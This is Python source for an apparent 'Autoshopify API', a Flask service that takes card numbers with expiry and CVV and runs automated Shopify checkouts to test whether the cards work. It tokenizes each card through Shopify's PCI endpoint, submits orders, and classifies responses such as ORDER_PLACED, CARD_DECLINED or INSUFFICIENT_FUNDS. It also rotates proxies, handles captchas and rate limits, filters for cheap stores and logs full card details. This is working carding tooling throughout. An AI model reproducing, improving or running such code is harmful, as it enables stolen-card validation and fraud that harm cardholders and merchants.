                        except:
                            shipping_amount = 0.0
                    else:
                        is_shipping_required = False
                    for item in delivery_lines[0].get("targetMerchandise", {}).get("linesV2", []):
                        if item.get("merchandise", {}).get("requiresShipping") is False:
                            is_shipping_required = False
                else:
                    is_shipping_required = False
            
            if not is_shipping_required:
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                elif tax_data and tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount'):
                    tax_amount = float(tax_data['totalTaxAmount']['value']['amount'])
                else:
                    tax_amount = 0.0
                
                if tax_amount <= 0.0 and float(running_total) > (float(subtotal) + shipping_amount):
                    tax_amount = round(float(running_total) - float(subtotal) - shipping_amount, 2)
            except:
                tax_amount = 0.0
            print(f"{tag} STEP 3: tax_amount={tax_amount} subtotal={subtotal} running_total={running_total}")

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        
                        if target_price_range:
                            try:
                                _bucket_ranges = {"1-10": 15.0, "11-20": 25.0, "21-49": 49.0}
                                if target_price_range in _bucket_ranges:
                                    max_r = _bucket_ranges[target_price_range]
                                elif target_price_range == "above_50":
                                    max_r = float('inf')
                                else:
                                    parts = str(target_price_range).split('-')
                                    max_r = float(parts[1]) if len(parts) > 1 else float('inf')
                                if float(total_price) > max_r:
                                    remove_site_from_simple_variants(site_url)
                                    return False, f"Total Price ${total_price} exceeds filter limit (${max_r})", gateway, total_price, currency
                            except Exception:
                                pass
                        
                        break
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            if delivery_strategy and json_data['variables']['delivery'].get('deliveryLines'):
                dl = json_data['variables']['delivery']['deliveryLines'][0]
                dl['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy,
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
                dl['targetMerchandiseLines'] = {'lines': [{'stableId': stableId or '1'}]}
                if is_shipping_required:
                    dl['deliveryMethodTypes'] = ['SHIPPING']
                    dl['expectedTotalPrice'] = {'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
                    dl['destination'] = {'streetAddress': {
                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }}
                else:
                    dl['deliveryMethodTypes'] = ['NONE']
                    dl['expectedTotalPrice'] = {'value': {'amount': '0.00', 'currencyCode': currency}}
                    dl.pop('destination', None)
                dl['destinationChanged'] = False
            else:
                json_data["variables"]["delivery"] = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stableId or "1"}],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": False
                }
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount'] = {'value': {'amount': str(tax_amount), 'currencyCode': currency}}
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, tag=tag
            )
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            try:
                p_json = json.loads(resp_text)
                res3b = (p_json.get("data", {}).get("session", {})
                         .get("negotiate", {}).get("result", {}))
                if res3b.get("queueToken"):
                    queueToken = res3b["queueToken"]
                    print(f"{tag} STEP 3b: Dynamically updated queueToken to {queueToken[:25]}...")
                if res3b.get("checkpointData"):
                    checkpoint_data = res3b["checkpointData"]
                if response and hasattr(response, "headers"):
                    new_sst = response.headers.get("X-Checkout-One-Session-Token") or response.headers.get("x-checkout-one-session-token")
                    if new_sst:
                        sst = new_sst
                        headers["x-checkout-one-session-token"] = sst
                        print(f"{tag} STEP 3b: Dynamically updated sst to {sst[:25]}...")

                sp = res3b.get("sellerProposal", {})
                print(f"{tag} STEP 3b: sellerProposal={json.dumps(sp)}")
                sp_mlines = sp.get("merchandise", {}).get("merchandiseLines", [])
                if sp_mlines and sp_mlines[0].get("stableId"):
                    stableId = sp_mlines[0]["stableId"]
                    print(f"{tag} STEP 3b: Dynamically updated stableId to {stableId}")
                if sp_mlines and sp_mlines[0].get("totalAmount", {}).get("value", {}).get("amount"):
                    subtotal = str(sp_mlines[0]["totalAmount"]["value"]["amount"])
                rt = sp.get("runningTotal", {}).get("value", {}).get("amount")
                tax_data = sp.get("tax", {})
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_amount = float(tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                elif sp.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount"):
                    tax_amount = float(sp["tax"]["totalTaxAmount"]["value"]["amount"])
                else:
                    tax_amount = 0.0

                if tax_amount <= 0.0 and rt and float(rt) > (float(subtotal) + (shipping_amount if is_shipping_required else 0.0)):
                    tax_amount = round(float(rt) - float(subtotal) - (shipping_amount if is_shipping_required else 0.0), 2)

                if rt:
                    running_total = rt
                try:
                    sub_f = float(subtotal)
                    shp_f = float(shipping_amount) if is_shipping_required else 0.0
                    tax_f = float(tax_amount)
                    if float(running_total) < (sub_f + shp_f + tax_f):
                        running_total = f"{(sub_f + shp_f + tax_f):.2f}"
                except Exception:
                    pass

                print(f"{tag} STEP 3b: delivery proposal done. running_total={running_total} tax_amount={tax_amount}")
                print(f"[DEBUG 3B] isShippingRequired={sp.get('isShippingRequired')} delivery={sp.get('delivery')}")
            except Exception as _e:
                print(f"{tag} STEP 3b: delivery proposal parse error: {_e}")

            cc_spaced = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            payload = {
                "credit_card": {
                    "number": cc_spaced,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            ua_to_use = headers.get('User-Agent') or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/52416cb/number-ltr.html?identifier=&locationURL=',
                'User-Agent': ua_to_use,
                'sec-ch-ua': headers.get('sec-ch-ua', '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"'),
                'sec-ch-ua-mobile': headers.get('sec-ch-ua-mobile', '?0'),
                'sec-ch-ua-platform': headers.get('sec-ch-ua-platform', '"Windows"'),
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig
            else:
                print(f"{tag} STEP 4: WARNING — ident_sig missing, PCI may rate-limit")
            
            print(f'{tag} STEP 4: Tokenizing card via PCI...')
            token = None
            use_direct_pci = False
            for attempt in range(3):
                try:
                    pci_proxy = None if (attempt >= 2 or use_direct_pci) else proxy
                    pci_resp = await session.post(
                        'https://checkout.pci.shopifyinc.com/sessions',
                        json=payload,
                        headers=vault_headers,
                        proxy=pci_proxy
                    )
                    if pci_resp.status == 403:
                        print(f"{tag} PCI attempt {attempt+1} got 403 (blocked proxy), switching to direct...")
                        use_direct_pci = True
                        if attempt < 2:
                            await asyncio.sleep(0.2)
                            continue
                    if pci_resp.status == 429:
                        wait = round(0.5 + random.random() * 1.5, 2)
                        print(f"{tag} PCI 429 attempt {attempt+1}/3, wait {wait}s...")
                        if attempt < 2:
                            await asyncio.sleep(wait)
                            continue
                        else:
                            last_pci_err = "Unable to get payment token: Rate limit exceeded"
                            break
                    res_json = await pci_resp.json()
                    token = res_json.get('id')
                    print(f"{tag} STEP 4: PCI token={bool(token)}")
                    if token:
                        break
                    last_pci_err = "Unable to get payment token"
                    if attempt < 2:
                        await asyncio.sleep(0.5)
                except Exception as e:
                    last_pci_err = f"Unable to get payment token: {e}"
                    print(f"{tag} PCI attempt {attempt+1} failed: {e}")
                    if "text/html" in str(e).lower() or "403" in str(e):
                        use_direct_pci = True
                    if attempt < 2:
                        await asyncio.sleep(0.3)

            if not token:
                return False, last_pci_err or 'Unable to get payment token', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            if delivery_strategy:
                delivery_payload = {
                    "deliveryLines": [{
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": delivery_strategy,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                        "deliveryMethodTypes": ["SHIPPING"] if is_shipping_required else ["NONE"],
                        "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}} if is_shipping_required else {"value": {"amount": "0.00", "currencyCode": currency}},
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": True,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                }
                if is_shipping_required:
                    delivery_payload["deliveryLines"][0]["destination"] = {"streetAddress": {
                        "address1": street, "address2": address2, "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone
                    }}
            else:
                delivery_payload = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stableId or "1"}],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": False
                }
            
            try:
                subtotal = f"{float(subtotal):.2f}"
            except Exception:
                pass
            try:
                running_total = f"{float(running_total):.2f}"
            except Exception:
                pass
            try:
                tax_str = f"{float(tax_amount):.2f}"
            except Exception:
                tax_str = "0.00"

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': delivery_payload,
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': tax_str, 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            print(f'{tag} STEP 5: Submitting for completion... payment_amount={submit_variables["input"]["payment"]["paymentLines"][0]["amount"]["value"]["amount"]} tax_amount={submit_variables["input"]["taxes"]["proposedTotalAmount"]["value"]["amount"]}')
            print(f'{tag} STEP 5: submit_input={json.dumps(submit_variables["input"])}')
            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, tag=tag
            )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            err_msg = error.get('message') or error.get('localizedMessage') or error.get('code')
                            if err_msg:
                                print(f'{tag} STEP 5 GraphQL error: {err_msg}')
                                return False, f"GraphQL Error: {err_msg}", gateway, total_price, currency
                    print(f'{tag} STEP 5 empty submit data. Full text: {text[:500]}')
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                print(f'{tag} STEP 5: Submit result_type={result_type}')
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        rid = receipt.get('id', '')
                        print(f'{tag} STEP 5: receipt_type={receipt_type} rid={str(rid)[:50]}')

                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency

                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    for _retry_round in range(3):
                        errors = submit_data.get('errors', [])
                        err_codes = [err.get('code', '') for err in errors]
                        bp = submit_data.get('buyerProposal') or submit_data.get('sellerProposal') or {}
                        print(f"{tag} STEP 5 (round {_retry_round+1}): Submit rejected raw text: {text}")
                        print(f"{tag} STEP 5 (round {_retry_round+1}): Submit rejected full errors: {errors}")
                        print(f"{tag} STEP 5 (round {_retry_round+1}): submit_data buyerProposal: {json.dumps(bp)}")
                        
                        need_retry = False
                        
                        # 1. Reconcile Delivery
                        bp_del = bp.get("delivery") or {}
                        bp_dlines = bp_del.get("deliveryLines", [])
                        bp_del_type = bp_del.get("__typename", "")
                        del_strat_handle = None
                        del_amt = 0.0

                        if bp_dlines and len(bp_dlines) > 0:
                            dl0 = bp_dlines[0]
                            sel = dl0.get("selectedDeliveryStrategy") or {}
                            del_strat_handle = sel.get("deliveryStrategyByHandle", {}).get("handle") or sel.get("handle")
                            if not del_strat_handle:
                                avail_strats = dl0.get("availableDeliveryStrategies") or []
                                if avail_strats:
                                    del_strat_handle = avail_strats[0].get("handle")
                                    val = avail_strats[0].get("amount", {}).get("value", {})
                                    try:
                                        del_amt = float(val.get("amount", "0"))
                                    except Exception:
                                        del_amt = 0.0
                            if not del_amt:
                                val = dl0.get("expectedTotalPrice", {}).get("value", {})
                                try:
                                    del_amt = float(val.get("amount", "0"))
                                except Exception:
                                    del_amt = 0.0

                        if is_shipping_required and del_strat_handle:
                            print(f"{tag} STEP 5: Locking delivery strategy {del_strat_handle} (amt={del_amt})...")
                            submit_variables["input"]["delivery"] = {
                                "deliveryLines": [{
                                    "selectedDeliveryStrategy": {
                                        "deliveryStrategyByHandle": {
                                            "handle": del_strat_handle,
                                            "customDeliveryRate": False
                                        },
                                        "options": {}
                                    },
                                    "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                                    "deliveryMethodTypes": ["SHIPPING"],
                                    "expectedTotalPrice": {"value": {"amount": str(del_amt), "currencyCode": currency}},
                                    "destinationChanged": False,
                                    "destination": {
                                        "streetAddress": {
                                            "address1": street, "address2": address2, "city": city,
                                            "countryCode": country_code, "postalCode": s_zip,
                                            "firstName": firstName, "lastName": lastName,
                                            "zoneCode": state, "phone": phone
                                        }
                                    }
                                }],
                                "noDeliveryRequired": [],
                                "useProgressiveRates": False,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": True
                            }
                            need_retry = True
                        elif not is_shipping_required or bp_del_type in ("UnfilledDeliveryTerms", "UnavailableTerms", "UnavailableDeliveryTerms") or "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in err_codes:
                            submit_variables["input"]["delivery"] = {
                                "deliveryLines": [],
                                "noDeliveryRequired": [{"stableId": stableId or "1"}],
                                "useProgressiveRates": False,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping": False
                            }
                            need_retry = True

                        # 2. Reconcile Merchandise
                        merch_amt = 0.0
                        bp_merch = bp.get("merchandise", {}).get("merchandiseLines", [])
                        if bp_merch:
                            for idx, ml in enumerate(bp_merch):
                                val = ml.get("totalAmount", {}).get("value", {}) or ml.get("linePrice", {}).get("value", {})
                                new_l_amt = val.get("amount")
                                if new_l_amt:
                                    try:
                                        merch_amt += float(new_l_amt)
                                    except Exception:
                                        pass
                                    if idx < len(submit_variables["input"]["merchandise"]["merchandiseLines"]):
                                        submit_variables["input"]["merchandise"]["merchandiseLines"][idx]["expectedTotalPrice"] = {
                                            "value": {"amount": str(new_l_amt), "currencyCode": currency}
                                        }
                                        if "linePrice" in submit_variables["input"]["merchandise"]["merchandiseLines"][idx]:
                                            submit_variables["input"]["merchandise"]["merchandiseLines"][idx]["linePrice"] = {
                                                "value": {"amount": str(new_l_amt), "currencyCode": currency}
                                            }
                            need_retry = True

                        # 3. Reconcile Tax & Total
                        tax_amt_val = tax_amount
                        bp_tax = bp.get("tax") or {}
                        new_tax = bp_tax.get("totalTaxAmount", {}).get("value", {}).get("amount")
                        if new_tax:
                            try:
                                tax_amt_val = float(new_tax)
                            except Exception:
                                pass

                        sub_val = merch_amt if merch_amt > 0 else float(subtotal or "0")
                        shp_val = float(del_amt if is_shipping_required else 0.0)

                        if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in err_codes or any(c.startswith("TAX_") for c in err_codes):
                            if is_shipping_required and shp_val > 0 and sub_val > 0:
                                if tax_amt_val > 0 and tax_amt_val < (sub_val + shp_val) * 0.04:
                                    tax_amt_val = round((sub_val + shp_val) * (tax_amt_val / sub_val), 2)
                                elif tax_amt_val <= 0:
                                    tax_amt_val = round((sub_val + shp_val) * 0.08, 2)
                            need_retry = True

                        submit_variables["input"]["taxes"] = {
                            "proposedAllocations": None,
                            "proposedTotalAmount": {"value": {"amount": f"{tax_amt_val:.2f}", "currencyCode": currency}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions": []
                        }

                        new_rt = (bp.get("runningTotal", {}).get("value", {}).get("amount")
                                  or bp.get("total", {}).get("value", {}).get("amount")
                                  or bp.get("checkoutTotal", {}).get("value", {}).get("amount"))
                        if new_rt:
                            try:
                                calculated_total = float(new_rt)
                            except Exception:
                                calculated_total = round(sub_val + shp_val + tax_amt_val, 2)
                        else:
                            calculated_total = round(sub_val + shp_val + tax_amt_val, 2)

                        for err in errors:
                            ext = err.get("extensions") or {}
                            ea = ext.get("expectedAmount") or ext.get("acceptableAmount") or err.get("expectedAmount")
                            if not ea:
                                msg = err.get("localizedMessage", "") or err.get("nonLocalizedMessage", "")
                                m = re.search(r'[\$\u00a3\u20ac]?([\d]+\.[\d]{2})', msg)
                                if m:
                                    ea = m.group(1)
                            if ea:
                                try:
                                    calculated_total = float(ea)
                                    break
                                except Exception:
                                    pass

                        if calculated_total and calculated_total > 0:
                            new_amt_str = f"{calculated_total:.2f}"
                            cur_tax_prop = submit_variables["input"]["taxes"]["proposedTotalAmount"]["value"]["amount"]
                            new_tax_str = f"{tax_amt_val:.2f}"
                            if new_amt_str == str(running_total) and new_tax_str == str(cur_tax_prop):
                                print(f"{tag} STEP 5: Cannot extract new amount (stuck on {running_total}). Breaking retry loop.")
                                need_retry = False
                            else:
                                running_total = new_amt_str
                                total_price   = running_total
                                print(f"{tag} STEP 5: Updating payment line to amount={running_total} tax={new_tax_str}")
                                submit_variables["input"]["payment"]["paymentLines"][0]["amount"]["value"]["amount"] = str(running_total)
                                submit_variables["input"]["payment"]["totalAmount"] = {"any": True}
                                submit_variables["input"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = new_tax_str
                                need_retry = True

                        # If errors are non-reconcilable (e.g. out of stock, card expired, product not available), exit immediately
                        unretryable = {"MERCHANDISE_OUT_OF_STOCK", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED", "MERCHANDISE_PRODUCT_NOT_PUBLISHED_IN_BUYER_LOCATION", "PAYMENTS_CREDIT_CARD_SESSION_ID"}
                        if any(c in unretryable for c in err_codes):
                            print(f"{tag} STEP 5: Non-retryable error detected: {err_codes}")
                            break

                        if not need_retry:
                            break

                        submit_json_data["variables"] = submit_variables
                        _, retry_text, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, tag=tag
                        )
                        try:
                            retry_json = json.loads(retry_text)
                            retry_sub = retry_json.get("data", {}).get("submitForCompletion", {})
                            if retry_sub:
                                submit_data = retry_sub
                                result_type = submit_data.get("__typename", "")
                                print(f"{tag} STEP 5 retry: Submit result_type={result_type}")
                                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                                    break
                                elif result_type != 'SubmitRejected':
                                    break
                        except Exception:
                            break
                    
                    if result_type == 'SubmitRejected':
                        if errors:
                            for error in errors:
                                code = error.get('code', '')
                                localized_msg = error.get('localizedMessage', '')
                                non_localized_msg = error.get('nonLocalizedMessage', '')
                                print(f'[SUBMIT REJECTED] card={cc}|{mes}|{ano}|{cvv} site={ourl} code={code!r} msg={localized_msg or non_localized_msg!r}')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                                    detail = localized_msg or non_localized_msg
                                    if detail:
                                        return False, detail, gateway, total_price, currency
                                if code:
                                    return False, code, gateway, total_price, currency
                        return False, "Submit Rejected", gateway, total_price, currency
                
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
                
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': QUERY_POLL,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt'
            }

            print(f'{tag} STEP 6: Polling for receipt (rid={rid[:30] if rid else "None"})...')
            for i in range(3):
                response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, poll_json_data, 
                    checkout_url, max_retries=1
                )
                print(f'{tag} STEP 6 Poll attempt {i+1} text: {final_text[:300]}')
                
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(1)
                            continue
                        
                except Exception as e:
                    pass
                
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(1)
                else:
                    break
            
            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency
            
            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except:
                pass
            
            code = extract_between(final_text, '{"code":"', '"')
            
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except asyncio.TimeoutError:
        print(f'[ERROR PROCESSING CARD] asyncio.TimeoutError for {gateway}')
        return False, "Timeout Error (Connection too slow)", gateway, total_price, currency
    except asyncio.CancelledError:
        print(f'[ERROR PROCESSING CARD] asyncio.CancelledError for {gateway}')
        return False, "Request Cancelled", gateway, total_price, currency
    except Exception as e:
        import traceback
        err_str = str(e)
        err_type = type(e).__name__.lower()
        # Proxy errors — return recognizable code so Go rotates proxy immediately
        if any(x in err_str.lower() for x in ['proxy', 'cannot connect to host', 'proxyerror', 'tunnel connection']) or 'proxy' in err_type:
            print(f'[ERROR PROCESSING CARD] Proxy Error: {err_type} - {err_str[:150]}')
            return False, f"Cannot connect to proxy: {err_str}", gateway, total_price, currency
            
        print(f'[ERROR PROCESSING CARD] Exception type: {type(e).__name__}')
        print(f'[ERROR PROCESSING CARD] Exception message: {err_str}')
        print(f'[ERROR PROCESSING CARD] Full traceback:')
        traceback.print_exc()
        return False, f"Error Processing Card: {err_str}", gateway, total_price, currency

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': parts[3].strip()
    }

async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, target_price_range=None):
    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str, target_price_range)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    info = {
        "api": "Autoshopify API",
        "version": "2.0.0",
        "status": "online",
        "developer": {
            "name": "NullX",
            "telegram": "https://t.me/nullxchk_bot"
        },
        "endpoints": {
            "GET /shopify": {
                "description": "Check a credit card against a Shopify store",
                "parameters": {
                    "site": {
                        "type": "string",
                        "required": True,
                        "example": "https://store.myshopify.com",
                        "description": "Full URL of the Shopify store"
                    },
                    "cc": {
                        "type": "string",
                        "required": True,
                        "example": "4111111111111111|12|25|123",
                        "description": "Card in format: NUMBER|MM|YY|CVV"
                    },
                    "proxy": {
                        "type": "string",
                        "required": False,
                        "example": "http://user:pass@host:port",
                        "description": "Optional proxy (http/socks5). Formats: ip:port, ip:port:user:pass, http://user:pass@ip:port"
                    }
                },
                "response": {
                    "Gateway": "Payment gateway name (e.g. shopify_payments)",
                    "Price": "Charged amount as float",
                    "Response": "Result code (e.g. ORDER_PLACED, CARD_DECLINED, INSUFFICIENT_FUNDS)",
                    "Status": "true if card reached processor, false if infra/site error",
                    "cc": "Echo of the input card string"
                },
                "example_request": "GET /shopify?site=https://store.myshopify.com&cc=4111111111111111|12|25|123&proxy=http://user:pass@host:port",
                "example_response": {
                    "Gateway": "shopify_payments",
                    "Price": 1.00,
                    "Response": "ORDER_PLACED",
                    "Status": True,
